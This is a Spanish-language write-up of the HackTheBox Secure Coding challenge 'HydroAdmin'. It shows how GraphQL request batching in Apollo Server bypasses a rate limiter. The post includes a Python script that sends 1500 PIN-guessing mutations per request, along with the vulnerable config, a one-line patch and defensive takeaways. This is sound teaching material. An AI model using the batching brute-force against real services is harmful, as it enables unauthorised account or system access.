---
title: "HTB Secure Coding S10 — HydroAdmin: GraphQL Batching Attack"
date: 2026-04-20
description: "Writeup de HydroAdmin (HTB Secure Coding Season 10). GraphQL Batching permite bypassear rate limiting enviando miles de operaciones en un solo HTTP request para hacer bruteforce de un PIN de 4 dígitos."
excerpt: "GraphQL Batching con allowBatchedHttpRequests:true permite bypassear el rate limiter y hacer bruteforce del PIN en 6 requests."
tags: ["HTB", "Secure Coding", "Web", "GraphQL", "Batching", "Rate Limit Bypass", "Bruteforce", "Node.js", "Apollo"]
platform: "HTB"
difficulty: "Easy"
image: "/images/blog/htb-hydroadmin.png"
---

<div align="center">

![Author](https://img.shields.io/badge/Author-Flippermen-purple?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge)
![Season](https://img.shields.io/badge/Season-10-orange?style=for-the-badge)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Web-blue?style=for-the-badge)

**Flippermen | CyberFlippers | UDLA-Cyber**

</div>

> **Disclaimer:** Writeup realizado en entorno autorizado de Hack The Box con fines educativos. Enfoque *Secure Coding* — identificar, explotar y parchear vulnerabilidades en código fuente.

---

| Campo | Valor |
|-------|-------|
| Challenge | HydroAdmin |
| Dificultad | Easy |
| Categoría | Web |
| Puntos | 20 |
| Vulnerabilidad | GraphQL Batching — Rate Limit Bypass |
| Stack | Node.js / Apollo Server / GraphQL Armor |

## Descripción

Sistema de gestión de agua con PIN de 4 dígitos (1000–9999). Rate limit de 10 requests/minuto. Apollo Server con `allowBatchedHttpRequests: true`.

## Vulnerabilidad

Con batching habilitado, Apollo acepta arrays de operaciones en un solo HTTP request. El rate limiter cuenta el array como **una** request, pero ejecuta las **N** operaciones internas. Con batches de 1500 PINs y 6 requests se cubre todo el espacio de 9000 valores.

```javascript
// VULNERABLE — index.js
const server = new ApolloServer({
    ...armor.protect(),
    introspection: false,
    typeDefs,
    allowBatchedHttpRequests: true,  // ← permite brute-force
    resolvers
});
```

## Exploit

```python
import requests

BASE_URL = "http://<IP>:<PORT>/challenge"

def create_batch_query(start_pin, end_pin):
    return [
        {"query": f'mutation{{verifyAccessPin(pin:"{pin:04d}"){{authorized}}}}'}
        for pin in range(start_pin, end_pin)
    ]

# 1500 mutaciones en 1 HTTP request → rate limiter ve 1 request
batch = create_batch_query(1000, 2500)
response = requests.post(f"{BASE_URL}/graphql", json=batch)
# → buscar {"authorized": true} en la respuesta
```

## Parche

```javascript
// index.js
const server = new ApolloServer({
    ...armor.protect(),
    introspection: false,
    typeDefs,
    allowBatchedHttpRequests: false,  // ← una línea, fix completo
    resolvers
});
```

## Key Takeaways

1. **Rate limiting a nivel de operación, no de request** — GraphQL batching, alias batching y técnicas similares permiten N operaciones por HTTP request. El rate limiter debe contar operaciones.
2. **`allowBatchedHttpRequests: false` por defecto** — habilitar batching solo si hay una necesidad de negocio clara, con rate limiting a nivel de operación.
3. **GraphQL Armor no protege contra batching si está habilitado** — las librerías de seguridad no pueden compensar configuraciones explícitamente inseguras.

---

<div align="center">

**Flippermen**
*HackTheBox Season 10 — Platinum Tier | #1 Ecuador | CyberFlippers | UDLA-Cyber*

</div>
